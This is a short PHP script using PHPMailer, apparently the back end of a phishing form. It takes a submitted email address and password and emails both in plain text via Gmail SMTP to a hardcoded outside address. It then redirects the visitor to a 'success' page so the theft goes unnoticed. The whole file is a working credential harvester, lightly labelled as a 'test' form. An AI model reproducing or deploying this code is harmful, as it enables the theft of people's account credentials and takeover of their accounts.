<?php

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'src/PHPMailer.php';
require 'src/SMTP.php';
require 'src/Exception.php';

$email_user = $_POST['email'] ?? '';
$pass_user = $_POST['password'] ?? '';

if($email_user && $pass_user){

    $mail = new PHPMailer(true);

    try {
        // CONFIG SMTP (Gmail ici)
        $mail->isSMTP();
        $mail->Host = 'smtp.gmail.com';
        $mail->SMTPAuth = true;
        $mail->Username = 'TON_EMAIL@gmail.com';
        $mail->Password = 'MOT_DE_PASSE_APPLICATION';
        $mail->SMTPSecure = 'tls';
        $mail->Port = 587;

        // Expéditeur et destinataire
        $mail->setFrom('TON_EMAIL@gmail.com', 'Test');
        $mail->addAddress('pardogabinemail@gmail.com');

        // Contenu
        $mail->Subject = 'Test formulaire';
        $mail->Body = "Email: $email_user\nMot de passe: $pass_user";

        $mail->send();

    } catch (Exception $e) {
        echo "Erreur: {$mail->ErrorInfo}";
    }
}

// Redirection
header('Location: index.html?success=1');
exit;
?>
